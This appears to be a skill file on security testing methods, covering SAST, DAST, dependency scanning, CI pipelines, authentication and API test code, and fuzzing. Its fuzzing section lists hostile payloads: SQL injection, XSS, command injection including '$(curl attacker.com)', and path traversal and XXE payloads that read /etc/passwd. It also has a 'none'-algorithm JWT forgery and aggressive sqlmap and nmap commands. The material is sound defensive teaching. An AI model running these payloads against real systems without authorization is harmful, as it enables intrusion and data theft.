---
name: security-testing-patterns
description: Security testing patterns including SAST, DAST, penetration testing, and vulnerability assessment techniques. Use when implementing security testing pipelines, conducting security audits, or validating application security controls.
---

# Security Testing Patterns

Expert guidance for implementing comprehensive security testing strategies including static analysis, dynamic testing, penetration testing, and vulnerability assessment.

## When to Use This Skill

- Implementing security testing pipelines in CI/CD
- Conducting security audits and vulnerability assessments
- Validating application security controls and defenses
- Performing penetration testing and security reviews
- Configuring SAST/DAST tools and interpreting results
- Testing authentication and authorization mechanisms
- Evaluating API security and compliance with OWASP standards
- Integrating security scanning into development workflows
- Responding to security findings and prioritizing remediation
- Training teams on security testing methodologies

## Security Testing Pyramid

**Layered Approach to Security Testing:**
1. **Unit Security Tests** - Test security functions (encryption, validation)
2. **SAST** - Static analysis during development
3. **SCA** - Dependency and component vulnerability scanning
4. **DAST** - Dynamic testing in running applications
5. **IAST** - Interactive analysis combining SAST and DAST
6. **Penetration Testing** - Manual security testing by experts
7. **Red Team Exercises** - Adversarial simulation testing

## Static Application Security Testing (SAST)

### Overview
SAST analyzes source code, bytecode, or binaries without executing the application to identify security vulnerabilities.

**Strengths:**
- Early detection in development lifecycle
- Complete code coverage analysis
- No running environment required
- Identifies exact code location of vulnerabilities

**Limitations:**
- Cannot detect runtime or configuration issues
- High false positive rates
- Limited understanding of business logic
- Language and framework specific

### Popular SAST Tools

**JavaScript/TypeScript:**
```bash
# ESLint with security plugins
npm install --save-dev eslint eslint-plugin-security

# SonarQube scanner
npm install --save-dev sonarqube-scanner

# Semgrep - polyglot static analysis
npm install -g @semgrep/cli
semgrep --config=auto src/
```

**Python:**
```bash
# Bandit - Python security linter
pip install bandit
bandit -r ./src -f json -o security-report.json

# Semgrep for Python
semgrep --config=p/python src/
```

**Java:**
```bash
# SpotBugs with Find Security Bugs plugin
mvn spotbugs:check

# SonarQube
mvn sonar:sonar
```

### SAST Integration in CI/CD

**GitHub Actions Example:**
```yaml
name: Security Scan

on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
            p/javascript

      - name: Run ESLint Security
        run: |
          npm install
          npm run lint:security

      - name: SonarCloud Scan
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

### Custom SAST Rules

**ESLint Security Rule Example:**
```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'warn',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-child-process': 'warn',
    'security/detect-disable-mustache-escape': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-non-literal-fs-filename': 'warn',
    'security/detect-non-literal-require': 'warn',
    'security/detect-possible-timing-attacks': 'warn',
    'security/detect-pseudoRandomBytes': 'error'
  }
};
```

**Semgrep Custom Rule:**
```yaml
# rules/hardcoded-secrets.yml
rules:
  - id: hardcoded-api-key
    pattern: |
      const $VAR = "$SECRET"
    message: Potential hardcoded API key detected
    severity: ERROR
    languages: [javascript, typescript]
    metadata:
      cwe: "CWE-798: Use of Hard-coded Credentials"
      owasp: "A07:2021 - Identification and Authentication Failures"
```

## Dynamic Application Security Testing (DAST)

### Overview
DAST tests running applications by simulating attacks from the outside, identifying vulnerabilities through black-box testing.

**Strengths:**
- Tests application in runtime environment
- Detects configuration and deployment issues
- Language and technology agnostic
- Identifies business logic vulnerabilities

**Limitations:**
- Requires running application
- Limited code coverage
- Cannot pinpoint exact code location
- May miss authentication-protected features

### OWASP ZAP (Zed Attack Proxy)

**Basic Scan:**
```bash
# Docker-based ZAP scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://example.com \
  -r zap-report.html

# Full scan with authentication
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://example.com \
  -c zap-config.conf \
  -r zap-full-report.html
```

**ZAP Configuration File:**
```conf
# zap-config.conf
# Authentication configuration
auth.loginUrl=https://example.com/login
auth.username=testuser
auth.password=testpass
auth.usernameField=email
auth.passwordField=password

# Exclusions
exclude.urls=https://example.com/logout,https://example.com/admin

# Spider settings
spider.maxDepth=5
spider.threadCount=2

# Active scan settings
scanner.strength=MEDIUM
scanner.attackStrength=MEDIUM
```

**ZAP API Integration:**
```javascript
// Node.js ZAP API client
const ZapClient = require('zaproxy');

async function runZapScan(targetUrl) {
  const zap = new ZapClient({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });

  // Start spider scan
  const spiderId = await zap.spider.scan(targetUrl);
  await zap.spider.waitForComplete(spiderId);

  // Start active scan
  const scanId = await zap.ascan.scan(targetUrl);
  await zap.ascan.waitForComplete(scanId);

  // Get alerts
  const alerts = await zap.core.alerts();

  // Generate report
  const report = await zap.core.htmlreport();

  return { alerts, report };
}
```

### Burp Suite Integration

**Automated Scanning with Burp Suite:**
```bash
# Burp Suite Enterprise API
curl -X POST "https://burp-enterprise.local/api/v1/scan" \
  -H "Authorization: Bearer $BURP_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "scope": {
      "included": [{"rule": "https://example.com", "type": "SimpleScopeDef"}]
    },
    "scan_configuration_ids": ["basic-crawl-and-audit"]
  }'
```

### DAST in CI/CD

**GitLab CI Example:**
```yaml
# .gitlab-ci.yml
dast:
  stage: security
  image: registry.gitlab.com/gitlab-org/security-products/dast:latest
  variables:
    DAST_WEBSITE: https://staging.example.com
    DAST_AUTH_URL: https://staging.example.com/login
    DAST_USERNAME: $DAST_USERNAME
    DAST_PASSWORD: $DAST_PASSWORD
  script:
    - /analyze
  artifacts:
    reports:
      dast: gl-dast-report.json
  only:
    - main
    - staging
```

## Software Composition Analysis (SCA)

### Dependency Scanning

**npm audit:**
```bash
# Basic vulnerability check
npm audit

# Generate detailed JSON report
npm audit --json > security-audit.json

# Fix automatically
npm audit fix

# Fix with breaking changes
npm audit fix --force
```

**Snyk Integration:**
```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor project
snyk monitor

# Test with custom severity threshold
snyk test --severity-threshold=high

# Generate JSON report
snyk test --json > snyk-report.json
```

**GitHub Dependabot Configuration:**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "security"
      - "dependencies"
    # Security updates only
    versioning-strategy: increase-if-necessary
```

**OWASP Dependency-Check:**
```bash
# Run dependency check
dependency-check --project "MyApp" \
  --scan ./package.json \
  --format JSON \
  --out ./reports

# With suppression file
dependency-check --project "MyApp" \
  --scan ./package.json \
  --suppression ./dependency-check-suppressions.xml \
  --format HTML \
  --out ./reports
```

## Penetration Testing Techniques

### Reconnaissance and Information Gathering

**Subdomain Enumeration:**
```bash
# Using subfinder
subfinder -d example.com -o subdomains.txt

# Using amass
amass enum -d example.com -o amass-results.txt

# DNS enumeration
dnsenum example.com
```

**Port Scanning:**
```bash
# Nmap comprehensive scan
nmap -sV -sC -O -A -p- example.com

# Fast scan of common ports
nmap -F -T4 example.com

# Service version detection
nmap -sV --version-intensity 5 example.com
```

### Vulnerability Assessment

**Web Vulnerability Scanning:**
```bash
# Nikto web server scanner
nikto -h https://example.com -output nikto-report.html -Format htm

# WPScan for WordPress
wpscan --url https://wordpress.example.com --enumerate ap,at,cb,dbe

# SQLMap for SQL injection
sqlmap -u "https://example.com/page?id=1" --batch --level=5 --risk=3
```

### Manual Testing Techniques

**Authentication Testing Checklist:**
```javascript
// Test cases for authentication
const authenticationTests = [
  {
    name: "Brute Force Protection",
    test: async () => {
      // Attempt multiple failed logins
      for (let i = 0; i < 10; i++) {
        await login({ username: 'test', password: 'wrong' });
      }
      // Verify account lockout or rate limiting
    }
  },
  {
    name: "Password Reset Token Security",
    test: async () => {
      const token = await requestPasswordReset('user@example.com');
      // Verify token entropy
      // Test token expiration
      // Attempt token reuse
      // Test token predictability
    }
  },
  {
    name: "Session Fixation",
    test: async () => {
      const sessionBefore = getSessionId();
      await login({ username: 'test', password: 'password' });
      const sessionAfter = getSessionId();
      // Verify session ID changes after authentication
      assert(sessionBefore !== sessionAfter);
    }
  },
  {
    name: "Session Timeout",
    test: async () => {
      await login({ username: 'test', password: 'password' });
      await wait(30 * 60 * 1000); // 30 minutes
      // Verify session is invalidated
      const response = await makeAuthenticatedRequest();
      assert(response.status === 401);
    }
  }
];
```

**Authorization Testing:**
```javascript
// Privilege escalation tests
const authorizationTests = {
  async testHorizontalPrivilegeEscalation() {
    // User A tries to access User B's resources
    const userA = await login({ username: 'userA', password: 'passA' });
    const userBResource = '/api/users/userB/profile';

    const response = await fetch(userBResource, {
      headers: { Authorization: `Bearer ${userA.token}` }
    });

    assert(response.status === 403, 'Horizontal privilege escalation possible');
  },

  async testVerticalPrivilegeEscalation() {
    // Regular user tries to access admin functions
    const regularUser = await login({ username: 'user', password: 'pass' });
    const adminEndpoint = '/api/admin/users';

    const response = await fetch(adminEndpoint, {
      headers: { Authorization: `Bearer ${regularUser.token}` }
    });

    assert(response.status === 403, 'Vertical privilege escalation possible');
  },

  async testInsecureDirectObjectReference() {
    // Test sequential ID enumeration
    const user = await login({ username: 'user', password: 'pass' });

    for (let id = 1; id <= 100; id++) {
      const response = await fetch(`/api/documents/${id}`, {
        headers: { Authorization: `Bearer ${user.token}` }
      });

      if (response.status === 200) {
        console.log(`IDOR vulnerability: User can access document ${id}`);
      }
    }
  }
};
```

## API Security Testing (OWASP API Top 10)

### API Security Test Suite

**API1: Broken Object Level Authorization:**
```javascript
// Test for BOLA vulnerabilities
async function testBOLA(apiUrl, authToken) {
  const testCases = [
    {
      name: "Access other user's resource",
      endpoint: `${apiUrl}/users/999/orders`,
      method: 'GET'
    },
    {
      name: "Modify other user's resource",
      endpoint: `${apiUrl}/users/999/profile`,
      method: 'PUT',
      body: { name: 'Attacker' }
    },
    {
      name: "Delete other user's resource",
      endpoint: `${apiUrl}/users/999/account`,
      method: 'DELETE'
    }
  ];

  for (const test of testCases) {
    const response = await fetch(test.endpoint, {
      method: test.method,
      headers: {
        'Authorization': `Bearer ${authToken}`,
        'Content-Type': 'application/json'
      },
      body: test.body ? JSON.stringify(test.body) : undefined
    });

    if (response.status === 200) {
      console.error(`BOLA vulnerability: ${test.name}`);
    }
  }
}
```

**API2: Broken Authentication:**
```javascript
// JWT security tests
function testJWTSecurity(token) {
  const tests = {
    // Test 1: Algorithm confusion
    noneAlgorithm: () => {
      const decoded = jwt.decode(token, { complete: true });
      const payload = decoded.payload;
      // Create token with "none" algorithm
      const maliciousToken = jwt.sign(payload, '', { algorithm: 'none' });
      return maliciousToken;
    },

    // Test 2: Weak secret
    weakSecret: async () => {
      const commonSecrets = ['secret', '123456', 'password', 'jwt'];
      for (const secret of commonSecrets) {
        try {
          jwt.verify(token, secret);
          console.error(`Weak JWT secret detected: ${secret}`);
          return true;
        } catch (err) {
          // Continue testing
        }
      }
      return false;
    },

    // Test 3: Token expiration
    expiration: () => {
      const decoded = jwt.decode(token);
      if (!decoded.exp) {
        console.error('JWT token has no expiration');
        return false;
      }
      const expirationTime = decoded.exp - decoded.iat;
      if (expirationTime > 3600) { // More than 1 hour
        console.warn('JWT token has long expiration time');
      }
      return true;
    }
  };

  return tests;
}
```

**API3: Excessive Data Exposure:**
```javascript
// Test for data leakage
async function testDataExposure(apiUrl, authToken) {
  const response = await fetch(`${apiUrl}/users/me`, {
    headers: { Authorization: `Bearer ${authToken}` }
  });

  const userData = await response.json();

  // Check for sensitive fields
  const sensitiveFields = [
    'password', 'passwordHash', 'ssn', 'creditCard',
    'bankAccount', 'taxId', 'secret', 'privateKey'
  ];

  const exposedFields = sensitiveFields.filter(field =>
    JSON.stringify(userData).toLowerCase().includes(field.toLowerCase())
  );

  if (exposedFields.length > 0) {
    console.error('Sensitive data exposed:', exposedFields);
  }
}
```

**API4: Lack of Resources & Rate Limiting:**
```javascript
// Rate limiting test
async function testRateLimiting(apiUrl, authToken) {
  const endpoint = `${apiUrl}/api/search`;
  const requests = 100;
  const results = [];

  console.log(`Sending ${requests} requests...`);

  for (let i = 0; i < requests; i++) {
    const start = Date.now();
    try {
      const response = await fetch(endpoint, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      results.push({
        status: response.status,
        time: Date.now() - start,
        rateLimitRemaining: response.headers.get('X-RateLimit-Remaining')
      });
    } catch (err) {
      results.push({ error: err.message });
    }
  }

  // Analyze results
  const successfulRequests = results.filter(r => r.status === 200).length;
  const rateLimited = results.filter(r => r.status === 429).length;

  console.log(`Successful: ${successfulRequests}/${requests}`);
  console.log(`Rate limited: ${rateLimited}/${requests}`);

  if (successfulRequests === requests) {
    console.error('No rate limiting detected - API vulnerable to abuse');
  }
}
```

## Fuzzing

### Input Fuzzing

**Basic Fuzzing Framework:**
```javascript
// Fuzzing test data generators
const fuzzingPayloads = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1' UNION SELECT NULL--",
    "admin'--",
    "' OR 1=1--"
  ],

  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'-alert('XSS')-'"
  ],

  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "& whoami",
    "`id`",
    "$(curl attacker.com)"
  ],

  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  ],

  bufferOverflow: [
    "A".repeat(1000),
    "A".repeat(10000),
    "%s%s%s%s%s%s%s%s%s%s",
    "\x00" + "A".repeat(100)
  ],

  xmlInjection: [
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<![CDATA[<script>alert('XSS')</script>]]>"
  ]
};

// Fuzzing test runner
async function fuzzEndpoint(url, parameter, payloads) {
  const results = [];

  for (const payload of payloads) {
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [parameter]: payload })
      });

      const body = await response.text();

      results.push({
        payload,
        status: response.status,
        vulnerable: detectVulnerability(body, payload)
      });
    } catch (err) {
      results.push({ payload, error: err.message });
    }
  }

  return results.filter(r => r.vulnerable);
}
```

**Property-Based Testing for Security:**
```javascript
// Using fast-check for property-based fuzzing
const fc = require('fast-check');

describe('Security Properties', () => {
  it('should sanitize all user input', () => {
    fc.assert(
      fc.property(
        fc.string(), // Generate random strings
        (input) => {
          const sanitized = sanitizeInput(input);
          // Property: sanitized output should not contain script tags
          return !/<script/i.test(sanitized);
        }
      ),
      { numRuns: 1000 } // Run 1000 times with random inputs
    );
  });

  it('should prevent SQL injection in queries', () => {
    fc.assert(
      fc.property(
        fc.string(),
        fc.string(),
        (username, password) => {
          const query = buildLoginQuery(username, password);
          // Property: query should use parameterization
          return !query.includes(username) && !query.includes(password);
        }
      )
    );
  });
});
```

## Security Test Automation Framework

### Comprehensive Security Pipeline

```yaml
# security-pipeline.yml
name: Security Testing Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * *' # Daily at 2 AM

jobs:
  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0

      - name: TruffleHog Secret Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Semgrep Scan
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten

      - name: CodeQL Analysis
        uses: github/codeql-action/analyze@v2

  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Snyk Dependency Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'MyApp'
          path: '.'
          format: 'JSON'

  dast:
    runs-on: ubuntu-latest
    needs: [sast, sca]
    steps:
      - name: Deploy to Test Environment
        run: |
          # Deploy application

      - name: OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://test.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'

      - name: Upload Trivy Results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
```

## Best Practices Summary

1. **Shift Left**: Integrate security testing early in development
2. **Continuous Testing**: Automate security scans in CI/CD pipelines
3. **Layered Approach**: Combine SAST, DAST, SCA, and manual testing
4. **Risk-Based Testing**: Prioritize testing based on threat model
5. **False Positive Management**: Establish process for triaging findings
6. **Remediation Tracking**: Use SIEM/SOAR for vulnerability management
7. **Regular Updates**: Keep security tools and signatures current
8. **Security Champions**: Train developers in security testing
9. **Metrics and KPIs**: Track security posture over time
10. **Compliance Validation**: Map tests to regulatory requirements

## Resources

- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **OWASP API Security**: https://owasp.org/www-project-api-security/
- **NIST SP 800-115**: Technical Guide to Information Security Testing
- **PTES**: Penetration Testing Execution Standard
- **SANS Security Testing**: https://www.sans.org/security-resources/
- **HackerOne Methodology**: https://www.hackerone.com/ethical-hacker/hack-learn
- **PortSwigger Academy**: https://portswigger.net/web-security
